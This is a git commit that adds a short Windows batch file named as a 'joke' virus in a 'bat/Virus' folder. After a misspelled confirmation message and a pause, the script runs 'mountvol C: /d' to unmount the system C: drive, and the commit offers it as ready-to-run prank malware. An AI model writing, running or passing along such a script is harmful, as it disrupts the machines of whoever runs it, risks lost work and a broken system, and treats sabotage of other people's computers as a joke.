e775c725b06189068cbfa0a648031aa8cec7faa0
Pa1Leon <154698240+Pa1Leon@users.noreply.github.com>
2024-05-29 05:53:58 +0200

    Create Joke.Win32Win64WinEject.bat

---
+++ bat/Virus/Joke.Win32Win64WinEject.bat
@@ -0,0 +1,6 @@
+@echo off
+echo are you sure you want tobrun this?
+echo TIP!: After this batch file ejects your drive [C:] restart or shut down this pc to revover C: Drive
+pause
+cls
+mountvol C: /d
